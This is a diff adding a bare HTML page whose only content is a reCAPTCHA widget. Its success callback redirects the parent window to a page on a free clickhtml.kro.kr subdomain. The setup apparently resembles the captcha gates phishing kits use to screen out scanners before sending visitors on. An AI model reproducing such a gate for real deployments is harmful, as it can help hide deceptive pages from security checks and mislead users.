@@ -1,0 +1,19 @@
+<html>
+  <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA</title>
+     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  </head>
+  <body>
+    <center>
+    <form action="?" method="POST">
+      <div id="recaptcha" class="g-recaptcha" data-sitekey="6LcQAOkUAAAAAB_K7vZxTAqjQb9MYVYggmhBfLz5" data-callback="onSuccess"></div><script>
+                      var onSuccess = function(response) {
+                        setTimeout(function() {
+                        parent.location.href = "https://clickhtml.kro.kr/templates/one/4/yay.html";
+                          }, 800);
+                        };</script>
+    </form>
+      </center>
+  </body>
+</html>
